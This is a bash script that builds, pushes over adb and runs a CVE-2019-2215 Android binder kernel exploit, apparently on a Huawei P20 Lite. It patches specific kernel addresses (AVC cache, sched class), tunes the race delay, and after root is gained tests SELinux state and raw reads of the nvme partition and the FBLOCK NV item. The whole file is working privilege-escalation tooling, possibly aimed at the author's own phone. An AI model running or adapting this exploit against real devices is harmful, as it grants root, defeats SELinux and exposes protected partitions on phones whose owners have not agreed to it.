#!/bin/bash
# Minimal-delta build: the winning configuration, with only the bug fixed.
#
# Established tonight:
#   - pristine source, DELAY=25        -> wins the race reliably
#   - + argv delay sweep               -> loses
#   - + cred-SID patch                 -> loses
#   - + cred-SID patch + argv          -> loses
# The race only survives when the compiled layout matches the one that wins, so
# anything added "just in case" costs the exploit. The cred-SID patch is also no
# longer needed: with the two kernel addresses corrected, the upstream SELinux
# flow (live_with_selinux -> overwrite_avc_cache -> live_with_selinux) works as
# designed. So: pristine + DELAY=25 + corrected constants, nothing else.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)

echo "############ restore pristine sources, pin DELAY=25, fix only the constants"
git checkout -- exploit/cve_2019_2215.c exploit/include/kernel_specific.h
python3 - <<'PY'
import re
h = '/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h'
s = open(h).read()
open(h, 'w').write(re.sub(r'#define DELAY \d+u', '#define DELAY 25u', s))

k = '/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h'
s = open(k).read()
s = s.replace('0xffffff8008f78408UL', '0xffffff8008f48408UL')
s = s.replace('0xffffff8008f78408ul', '0xffffff8008f48408ul')
s = s.replace('0xffffff800a2d4c40ul', '0xffffff800a276c40ul')
open(k, 'w').write(s)
PY
grep -nE "^#define DELAY" exploit/include/cve_2019_2215.h
grep -nE "AVC_CACHE|FAIR_SCHED_CLASS" exploit/include/kernel_specific.h | head -4

echo
echo "############ build and push"
"${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2
ls -la libs/arm64-v8a/cve-2019-2215
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ run: root AND the FBLOCK read in one go"
for i in 1 2 3; do
  echo "--- attempt $i"
  printf 'id\ncat /proc/self/attr/current\nblockdev --getsize64 /dev/block/bootdevice/by-name/nvme 2>&1\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n/data/local/tmp/hisi-nve r FBLOCK 2>&1 | head -12\n' \
    | timeout 90 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/min_$i.out" 2>&1
  OUT=$(tr -d '\000' < "/tmp/min_$i.out")
  if echo "$OUT" | grep -aq "uid=0(root)"; then
    if echo "$OUT" | grep -aq "denied"; then
      echo "    root YES, SELinux still denies"
    else
      echo "    >>>>>> ROOT AND BLOCK ACCESS <<<<<<"
      echo "$OUT" | tail -14
      exit 0
    fi
  else
    echo "    no root ($(echo "$OUT" | tail -1 | cut -c1-60))"
  fi
  sleep 4
done
echo
echo "### no win in 3 attempts; last output:"
tr -d '\000' < /tmp/min_3.out | tail -8
